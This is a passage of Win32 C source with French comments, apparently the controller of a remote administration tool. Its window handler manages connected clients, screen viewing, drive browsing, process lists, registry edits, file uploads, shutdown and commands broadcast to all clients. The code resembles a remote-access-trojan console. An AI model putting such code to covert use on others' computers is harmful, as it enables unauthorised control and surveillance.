            /* Initialisation des variables globales */
            lvItemActuel = -1; // indispensable
            TextColor = RGB(255, 255, 255); /* couleur blanche */
            ACTIVE_MENU = TRUE;
            REFRESH_CONSOLE = TRUE;
            HIDE_CONSOLE_MSG = FALSE;
            IS_MAIN_WINDOW_ACTIVE = FALSE;//TRUE;
            ACTIVE_LIST_COMMANDES = FALSE;
            AUTOSHOW_DOWNLOAD_UPLOAD_LIST = FALSE;//TRUE;
            SEND_TO_ALL = FALSE;
            CRYPT_DECRYPT = CRYPT_DECRYPT_DEFAULT;
            CHECK_COMMANDS = CHECK_COMMANDS_DEFAULT;
            SHOW_EXPLORE_TYPE = SHOW_EXPLORE_TYPE_DEFAULT;
            SHOW_EXPLORE_EXT = SHOW_EXPLORE_EXT_DEFAULT;
            char *pt = get_time(1);
            sprintf(fichierLog, "%s\\%s.txt", LOG_FOLDER, pt);
            free(pt);
            /* Cr�ation du dossier de sauvegarde des logs, s'il existe �a ne changera rien */
            CreateDirectory(LOG_FOLDER, NULL);
            /* Check or Uncheck Menu checkboxs */
            hMenu = GetMenu(hwnd);
            CheckMenuItem(hMenu, IDM_HIDE_CONSOLE_MSG, HIDE_CONSOLE_MSG ? MF_CHECKED : MF_UNCHECKED);
            CheckMenuItem(hMenu, IDM_REFRESH_CONSOLE, REFRESH_CONSOLE ? MF_CHECKED : MF_UNCHECKED);
            CheckMenuItem(hMenu, IDM_AUTOSHOW_D_U_LIST, AUTOSHOW_DOWNLOAD_UPLOAD_LIST ? MF_CHECKED : MF_UNCHECKED);
            /* Cr�ation/Lancement des Threads */
            hThread = CreateThread(NULL, 0, Serveur, NULL, 0, &dwThreadId);
            } 
            break;
       case WM_NOTIFY:
            switch(LOWORD(wParam))
	        {
                case LST_CLIENTS: // si c'est notre ListView
                   switch (((LPNMHDR)lParam)->code)
                   {
                       case LVN_ITEMCHANGED: // Changement de l'item actuel de la ListView
                       {
                          NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)lParam;
                          if ((pNMListView->uChanged & LVIF_STATE) && (pNMListView->uNewState & LVIS_SELECTED))
                              lvItemActuel = ((LPNM_LISTVIEW)lParam)->iItem; // on sauvegarde l'item
                              // si le client qui �tait s�l�ctionn� se d�connecte lvItemActuel sera == -1, grace � la fct. disconnect_client()
                       }
                       break;
                       case NM_CLICK: // NM_CLICK - Single click on an item
                          // Si un client est s�l�ctionn�
                          if (lvItemActuel != -1)
                          {
                              // Si on visionne d�j� la fen�tre de ce client
                              if (clients[lvItemActuel].show_screen)
                                   EnableWindow(hwBtShowScreen, FALSE);
                              else // si nn
                                  EnableWindow(hwBtShowScreen, TRUE);
                          }
                       break;
                   } // fin 2�me switch
                   break;
            } // fin 1er switch
            break;
       case WM_CLOSE:
            ShowWindow(hwnd, SW_HIDE); /* On cahe la fen�tre */
            IS_MAIN_WINDOW_ACTIVE = FALSE;
            //DestroyWindow(hwnd); /* Message pour detruire la fenetre */
            break;
        case MY_WM_NOTIFYICON:
             switch (lParam)
             {
                 case WM_LBUTTONUP:
                         ShowWindow(hwnd, SW_SHOW & SW_MAXIMIZE); /* Affichage de la fen�tre */
                         IS_MAIN_WINDOW_ACTIVE = TRUE;
                      break;
                 case WM_RBUTTONUP:
                      if (ACTIVE_MENU)
                      {
                         /* Cr�ation du menu de notification */
                         HMENU hmenu; 
                         HMENU hpopup;
                         POINT pos; 
                         GetCursorPos(&pos); 
                         hmenu = LoadMenu(hInst, "TRAYMENU"); 
                         hpopup = GetSubMenu(hmenu, 0);
                         //HiliteMenuItem(hwnd, hpopup, IDM_USER_INTERFACE, MF_BYCOMMAND | MF_HILITE); /* Item s�l�ctionn� � l'ouverture du menu */
                         SetForegroundWindow(hwnd); 
                         TrackPopupMenuEx(hpopup, 0, pos.x, pos.y, hwnd, NULL);               
                         DestroyMenu(hmenu);
                      }
                      break;
             }
             break;
        case WM_COMMAND:
             /* Gestion des actions (clics buttons, menu, ecriture, ...) */
             switch (LOWORD(wParam))
             {
                 case IDM_HIDE_CONSOLE_MSG:
                      HIDE_CONSOLE_MSG = HIDE_CONSOLE_MSG ? FALSE : TRUE;
                      CheckMenuItem(hMenu, IDM_HIDE_CONSOLE_MSG, HIDE_CONSOLE_MSG ? MF_CHECKED : MF_UNCHECKED);
                      break;
                 case IDB_DISCONNECT:
                 case IDB_TODO_LIST:
                 case IDB_UPDATE_CONFIG:
                 case IDB_UPLOAD_FILE:
                     // On fait toujours les m�mes v�rifications
                     if (actualClientsNumber > 0)
                     {
                         if (lvItemActuel != -1) // Si un client est s�l�ctionn�
                         {
                            if (clients[lvItemActuel].send_file)
                               MessageBox(hwnd, "Le client est en train d'envoyer un fichier !", NOM_APP, MB_OK | MB_ICONWARNING);
                            else if (clients[lvItemActuel].recv_file)
                               MessageBox(hwnd, "Le client re�oit un fichier !", NOM_APP, MB_OK | MB_ICONWARNING);
                            else
                            {
                                if (LOWORD(wParam) == IDB_UPDATE_CONFIG)
                                {
                                   clients[lvItemActuel].update_config = TRUE;
                                   EnableWindow(hwBtUpdateConfig, FALSE); /* D�sactivation du boutton */
                                   DialogBox(hInst, "UPDATE_CONFIG", NULL, (DLGPROC)UpdateConfigDlgProc);
                                   // L'activation du boutton est dans la proc�dure apr�s appuis sur le boutton fermer
                                }
                                else if (LOWORD(wParam) == IDB_UPLOAD_FILE)
                                {
                                   char selectedFilePath[EXPLORE_MAX_PATH];
                                   
                                   if (browseForFile(hwnd, "Choose file to upload", selectedFilePath))
                                   {
                                      char cmd[EXPLORE_MAX_PATH + 10];
                                      
                                      sprintf(cmd, "Recv_File %s", selectedFilePath);
                                      write_client(&clients[lvItemActuel], cmd, TRUE);
                                   }
                                }
                                else if (LOWORD(wParam) == IDB_TODO_LIST)
                                {
                                   clients[lvItemActuel].todo_list_opened = TRUE;
                                   EnableWindow(hwBtToDoList, FALSE); /* D�sactivation du boutton */
                                   DialogBox(hInst, "TODO_LIST", NULL, (DLGPROC)ToDoListDlgProc);
                                   // L'activation du boutton est dans la proc�dure apr�s appuis sur le boutton fermer
                                }
                                else if (LOWORD(wParam) == IDB_DISCONNECT)
                                {
                                   disconnect_client(lvItemActuel, TRUE);
                                }
                            }
                         }
                         else
                            MessageBox(hwnd, "Veuillez s�lectionner un client !", NOM_APP, MB_OK | MB_ICONWARNING);
                      }
                      else
                         MessageBox(hwnd, "Aucun client en ligne !", NOM_APP, MB_OK | MB_ICONWARNING);
                     break;
                case IDB_TURN_OFF:
                     EnableWindow(hwBtTurnOff, FALSE); /* D�sactivation du boutton */
                     DialogBox(hInst, "TURN_OFF", NULL, (DLGPROC)TurnOffDlgProc);
                     // L'activation du boutton est dans la proc�dure apr�s appuis sur le boutton fermer
                     break;
                case IDB_DOWNS_UPLS_LIST:
                     ShowWindow(hwFenDownloadsUploads, IsWindowVisible(hwFenDownloadsUploads) ? SW_HIDE : SW_SHOW & SW_MAXIMIZE);
                     break;
                case IDB_SET_SOUND:
                     EnableWindow(hwBtSetSound, FALSE); /* D�sactivation du boutton */
                     DialogBox(hInst, "SET_SOUND", NULL, (DLGPROC)SetSoundDlgProc);
                     // L'activation du boutton est dans la proc�dure apr�s appuis sur le boutton fermer
                     break;
                case IDB_UPDATE_REGISTRY:
                     EnableWindow(hwBtUpdateRegistry, FALSE); /* D�sactivation du boutton */
                     DialogBox(hInst, "UPDATE_REGISTRY", NULL, (DLGPROC)UpdateRegistryDlgProc);
                     // L'activation du boutton est dans la proc�dure apr�s appuis sur le boutton fermer
                     break;
                 case IDB_TASKS_LIST:
                 case IDB_EXPLORE_DRIVE:
                 case IDB_SHOW_SCREEN:
                      // On effectue les m�mes v�rifications
                      if (actualClientsNumber > 0)
                      {
                         if (lvItemActuel != -1) /* Si un client est s�l�ctionn� */
                         {
                            if (clients[lvItemActuel].send_file)
                               MessageBox(hwnd, "Le client est en train d'envoyer un fichier !", NOM_APP, MB_OK | MB_ICONWARNING);
                            else if (clients[lvItemActuel].recv_file)
                               MessageBox(hwnd, "Le client re�oit un fichier !", NOM_APP, MB_OK | MB_ICONWARNING);
                            else
                            {
                                    if (LOWORD(wParam) == IDB_EXPLORE_DRIVE) // si Explore Drive
                                    {
                                        clients[lvItemActuel].explore_drive = TRUE;
                                        EnableWindow(hwBtExploreDrive, FALSE); /* D�sactivation du boutton */
                                        DialogBox(hInst, "EXPLORE_DRIVE", NULL, (DLGPROC)ExploreDriveDlgProc);
                                        // la remise en FALSE de explore_drive et l'activation du boutton
                                        // sont dans la proc�dure apr�s appuis sur le boutton fermer
                                    }
                                    else if (LOWORD(wParam) == IDB_TASKS_LIST) // si nn si Task(s)/Process List
                                    {
                                        clients[lvItemActuel].task_list_opened = TRUE;
                                        EnableWindow(hwBtTasksList, FALSE); /* D�sactivation du boutton */
                                        DialogBox(hInst, "TASK_LIST", NULL, (DLGPROC)TaskListDlgProc);
                                        // la remise en FALSE de task_list_opened et l'activation du boutton
                                        // sont dans la proc�dure apr�s appuis sur le boutton fermer
                                    }
                                    else if (LOWORD(wParam) == IDB_SHOW_SCREEN) // si nn si Show Screen
                                    {
                                        // Show Screen ...........
                                        // Disable Show Screen Button
                                        EnableWindow(hwBtShowScreen, FALSE);
                                        // Cr�ation de la fen�tre
                                        CreateShowScreenDialogBox();
                                    }
                            }
                         }
                         else
                            MessageBox(hwnd, "Veuillez s�lectionner un client !", NOM_APP, MB_OK | MB_ICONWARNING);
                      }
                      else
                         MessageBox(hwnd, "Aucun client en ligne !", NOM_APP, MB_OK | MB_ICONWARNING);
                      break;
                 case IDM_APROPOS:
                      ACTIVE_MENU = FALSE;
                      DialogBox(hInst, "APROPOS", hwnd, (DLGPROC)AproposDlgProc);
                      ACTIVE_MENU = TRUE;
                      break;
                 case IDB_LAUNCH_LST_CMD:
                 case IDM_OPEN_CMD_LIST:
                      if (!ACTIVE_LIST_COMMANDES)
                      {
                         ACTIVE_LIST_COMMANDES = TRUE;
                         DialogBox(hInst, "COMMANDLIST", NULL, (DLGPROC)CommandeListeDlgProc);
                         ACTIVE_LIST_COMMANDES = FALSE;
                      }
                      break;
                 case IDM_QUITTER:
                      DestroyWindow(hwnd);
                      break;
                 case IDM_OPEN_LOG:
                      ShellExecute(NULL, "open", fichierLog, NULL, NULL, SW_SHOWNORMAL);
                      break;
                 case IDM_AUTOSHOW_D_U_LIST:
                      AUTOSHOW_DOWNLOAD_UPLOAD_LIST = AUTOSHOW_DOWNLOAD_UPLOAD_LIST ? FALSE : TRUE;
                      CheckMenuItem(hMenu, IDM_AUTOSHOW_D_U_LIST, AUTOSHOW_DOWNLOAD_UPLOAD_LIST ? MF_CHECKED : MF_UNCHECKED);
                      break;
                 case IDM_SETTINGS:
                      DialogBox(hInst, "SETTINGS", hwnd, (DLGPROC)SettingsDlgProc);
                      break;
                 case IDB_SEND_TO_ALL:
                      /*
                      if (SEND_TO_ALL)
                         SEND_TO_ALL = FALSE;
                      else
                         SEND_TO_ALL = TRUE;
                      */
                      SEND_TO_ALL = SEND_TO_ALL ? FALSE : TRUE;
                      break;
                 case IDM_REFRESH_CONSOLE:
                      REFRESH_CONSOLE = REFRESH_CONSOLE ? FALSE : TRUE;
                      CheckMenuItem(hMenu, IDM_REFRESH_CONSOLE, REFRESH_CONSOLE ? MF_CHECKED : MF_UNCHECKED);
                      if (DestroyWindow(hwRichConsole))
                      {
                          if (REFRESH_CONSOLE)
                              hwRichConsole = CreateWindowEx(WS_EX_CLIENTEDGE, RICHEDIT_CLASS, ""
                                            , WS_VISIBLE | WS_CHILD | ES_MULTILINE | ES_DISABLENOSCROLL | WS_VSCROLL | ES_READONLY
                                            , 10, 355, 320, 260, hwnd, NULL, hInst, NULL);
                          else
                              hwRichConsole = CreateWindowEx(WS_EX_CLIENTEDGE, RICHEDIT_CLASS, ""
                                            , WS_VISIBLE | WS_CHILD | ES_MULTILINE | ES_DISABLENOSCROLL | WS_VSCROLL | WS_HSCROLL | ES_READONLY
                                            , 10, 355, 320, 260, hwnd, NULL, hInst, NULL);
                          SendMessage(hwRichConsole, EM_SETBKGNDCOLOR, 0, BkEditcolor); // couleur de fond noir
                          SendMessage(hwRichConsole, WM_SETFONT, (long)policeButton, 0); // police
                          lireLogEtAfficherSurRichConsole(fichierLog);
                          changerCouleurRichEdit(hwRichConsole, TextColor); // couleur du texte
                      }
                      break;
                 case IDM_CONSOLE_COULEUR:
                      {
                      CHOOSECOLOR cc;
                      static COLORREF acrCustClr[16];
                      
                      ZeroMemory(&cc, sizeof(CHOOSECOLOR));
                      cc.lStructSize = sizeof(CHOOSECOLOR);
                      cc.hwndOwner = hwnd;
                      cc.lpCustColors = NULL;
                      cc.lpCustColors = (LPDWORD)acrCustClr;
                      cc.rgbResult = BkEditcolor;
                      cc.Flags = CC_FULLOPEN | CC_RGBINIT;
   
                      if (ChooseColor(&cc) == TRUE)
                      {
                         BkEditcolor = cc.rgbResult;
                         SendMessage(hwRichConsole, EM_SETBKGNDCOLOR, 0, BkEditcolor); // couleur de fond
                      }
                      }
                      break;
                 case IDM_TEXTE_COULEUR:
                      {
                      CHOOSECOLOR cc;
                      static COLORREF acrCustClr[16];
                      
                      ZeroMemory(&cc, sizeof(CHOOSECOLOR));
                      cc.lStructSize = sizeof(CHOOSECOLOR);
                      cc.hwndOwner = hwnd;
                      cc.lpCustColors = NULL;
                      cc.lpCustColors = (LPDWORD)acrCustClr;
                      cc.rgbResult = TextColor;
                      cc.Flags = CC_FULLOPEN | CC_RGBINIT;
   
                      if (ChooseColor(&cc) == TRUE)
                      {
                         TextColor = cc.rgbResult;
                         changerCouleurRichEdit(hwRichConsole, TextColor); // couleur du texte
                         //PostMessage(hwRichConsole, WM_SETREDRAW, TRUE, 0);
                      }
                      }
                      break;
                 case IDM_CLEAR_CONSOLE:
                      {
                      char *pt = get_time(1);
                      sprintf(fichierLog, "logs\\%s.txt", pt); // utilisation d'un nouveau fichier log
                      free(pt);
                      SendMessage(hwRichConsole, WM_SETTEXT, 0, (LPARAM)""); /* Vidage de l'�cran */
                      }
                      break;
                 case IDB_SEND:
                      {
                      if (actualClientsNumber > 0)
                      {
                         int texteSize = GetWindowTextLength(hwCommandeLine);
                         if (texteSize > 0)
                         {
                            if (lvItemActuel != -1 || SEND_TO_ALL) /* Si un client est s�lectionn� ou SEND TO ALL coch� */
                            {
                               /* On r�cup�re la commande */
                               char *texte = (char*)LocalAlloc(LMEM_FIXED, texteSize+1);
                               GetWindowText(hwCommandeLine, texte, texteSize+1);
                               
                               /* V�rification de la commande */
                               if (!checkCommande(hwnd, texte)) break;
                               
                               /* Si on ne doit pas envoyer la commande a tout le monde */
                               if (!SEND_TO_ALL)
                               {
                                  if (clients[lvItemActuel].send_file)
                                     MessageBox(hwnd, "Le client est en train d'envoyer un fichier !", NOM_APP, MB_OK | MB_ICONWARNING);
                                  else if (clients[lvItemActuel].recv_file)
                                     MessageBox(hwnd, "Le client re�oit un fichier !", NOM_APP, MB_OK | MB_ICONWARNING);
                                  else
                                     write_client(&clients[lvItemActuel], texte, TRUE);
                               }
                               else /* Si nn (si on doit l'envoyer a tout le monde) */
                                  send_message_to_all_clients(clients, actualClientsNumber, texte);
                               /* Insertion de la commande dans l'historique */
                               SendMessage(hwCommandeLine, CB_INSERTSTRING, 0, (LONG)texte);
                               /* Vidage de la CommandeLine */
                               SendMessage(hwCommandeLine, WM_SETTEXT, 0, (LPARAM)"");
                            }
                            else
                               MessageBox(hwnd, "Veuillez s�lectionner un client !", NOM_APP, MB_OK | MB_ICONWARNING);
                         }
                         else
                            MessageBox(hwnd, "Veuillez entrer une commande !", NOM_APP, MB_OK | MB_ICONWARNING);
                      }
                      else
                         MessageBox(hwnd, "Aucun client en ligne !", NOM_APP, MB_OK | MB_ICONWARNING);
                      SetFocus(hwCommandeLine);
                      }
                      break;
             }
             break;
        case WM_DESTROY:
             /* Destruction de la fenetre */ 
             CloseHandle(hThread); /* On arr�te le thread */
             Shell_NotifyIcon(NIM_DELETE, &TrayIcon); /* Suppression de la notification */
             PostQuitMessage(0); 
             break; 
        default: 
             return DefWindowProc(hwnd, uMsg, wParam, lParam); 
    } 
    
    return 0;
}

//=============================================================================
//         Proc�dure qui g�re les �vennements de la commande line
//                         (appui sur entr�...)
//=============================================================================

LRESULT CALLBACK editProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
   //int id = GetDlgCtrlID(hwnd);
   
   //if (IDC_COMMANDELINE == id)
   //{
      switch (message)
      {
   	     case WM_KEYDOWN:
            if (wParam == VK_RETURN)
            {
               // Gestion de la touche entr�e.
               PostMessage(hwFenetre, WM_COMMAND, IDB_SEND, 0); // simmule l'appui sur le boutton send
            }
         break;
      }
   //}
   
   return CallWindowProc(oldProc, hwnd, message, wParam, lParam);
}
